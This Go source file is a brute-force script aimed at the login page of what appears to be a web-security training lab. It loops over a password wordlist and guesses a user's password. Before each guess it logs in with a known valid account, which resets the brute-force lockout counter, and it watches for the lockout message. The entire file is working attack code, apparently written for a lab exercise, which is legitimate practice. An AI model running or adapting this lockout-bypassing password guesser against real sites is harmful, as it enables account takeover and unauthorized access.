package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
)

func SendLoginRequest(LabURL string, username string, password string) {

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		}}

	// Params
	data := url.Values{}
	data.Set("username", username)
	data.Set("password", password)

	req, err := http.NewRequest(http.MethodPost, (LabURL + "/login"), strings.NewReader(data.Encode()))
	if err != nil {
		log.Fatalln(err)
	}

	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatalln(err)
	}

	if strings.Contains(string(body), "You have made too many incorrect login attempts. Please try again in 1 minute(s).") {
		fmt.Println("We are blocked")
    		os.Exit(0)
	}

	if resp.StatusCode == 302 && username != "wiener" {
		fmt.Println("Password found:", password)
		os.Exit(0)
	}

}

func main() {

	const (
		passwordFile = "C:\\Users\\bwelb\\Desktop\\Wordlists\\passwords.txt"
		LabURL       = "https://ac751f1e1e638285c00e10bf000600e9.web-security-academy.net"
	)

	PwdFile, err := os.Open(passwordFile)
	if err != nil {
		log.Fatal(err)
	}

	defer PwdFile.Close()

	passwords := bufio.NewScanner(PwdFile)

	for passwords.Scan() {

		SendLoginRequest(LabURL, "wiener", "peter")
		SendLoginRequest(LabURL, "carlos", passwords.Text())

	}

	if err := passwords.Err(); err != nil {
		log.Fatal(err)
	}

}
